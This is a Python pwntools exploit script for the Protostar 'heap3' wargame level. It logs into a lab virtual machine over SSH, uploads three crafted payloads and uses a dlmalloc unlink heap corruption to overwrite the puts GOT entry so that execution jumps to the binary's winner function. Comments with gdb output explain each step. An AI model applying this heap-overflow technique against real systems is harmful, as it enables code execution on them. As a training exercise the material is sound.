#!/usr/bin/env python3
from pwn import *
import re
context.update(arch='i386', os='linux')
context.bits =32

def execute_exploit(p1, p2, p3, showOuput=True):
    tmpFile1 = '/tmp/payload1'
    tmpFile2 = '/tmp/payload2'
    tmpFile3 = '/tmp/payload3'
    exe = '/opt/protostar/bin/heap3'
    cmd = '$(cat {}) $(cat {}) $(cat {})'.format(tmpFile1, tmpFile2, tmpFile3)

    s = ssh(host='192.168.12.128', user='user', password='user')
    s.upload_data(p1, tmpFile1)
    s.upload_data(p2, tmpFile2)
    s.upload_data(p3, tmpFile3)
    sh = s.run('{} {}'.format(exe, cmd))
    if showOuput:
        print(sh.recvS())
    s.close()

'''
0x08048935 <main+172>:  call   0x8048790 <puts@plt>
0x0804893a <main+177>:  leave  
0x0804893b <main+178>:  ret    
End of assembler dump.
(gdb) x/3i 0x8048790
0x8048790 <puts@plt>:   jmp    DWORD PTR ds:0x804b128
0x8048796 <puts@plt+6>: push   0x68
0x804879b <puts@plt+11>:        jmp    0x80486b0
(gdb) 
'''
puts = 0x0804b128
got = puts-0xc

'''
(gdb) info proc mappings
'''

# Where we redirect our execution point
# For some reason, when the heap address is being read in, it is being reversed. 
# If we add 0x4 to it, we can still run.
heap = 0x0804c000 + 0x4

#size = 0x64
size = 0x50
inUse = 0x1

# This is read as -4
dlCheatCode = 0xfffffffc

'''
(gdb) x winner
0x8048864 <winner>:     push   ebp
'''
winner = 0x8048864

# Now we just need to load in the address of the function that we want to redirect to.
shellcode =  asm('mov eax, {}'.format(winner))
shellcode += asm('call eax')

# Just use some offset to get past the size for the first allocated chunk.
payload1 = b'A'*0xc + shellcode

# Need to fill up our second chunk completely (32 bytes + overhead). This can be garbage. 
# Important part here is to set the size of the next chunk to >80 and set the in use bit.
payload2 = b'B'*36+p32(size + inUse)

# This is important. First part is garbage. Next, we want to set the front and back
# pointers to -4. Next, is the address of the code we want to overwrite. Finally, 
# what we overwrite the code with. In this case, we want to jump *back* to the 
# heap, where we have our shell code.
payload3 = b'C'*(size-0x8)+p32(dlCheatCode)*2+p32(got)+p32(heap)

execute_exploit(payload1, payload2, payload3)
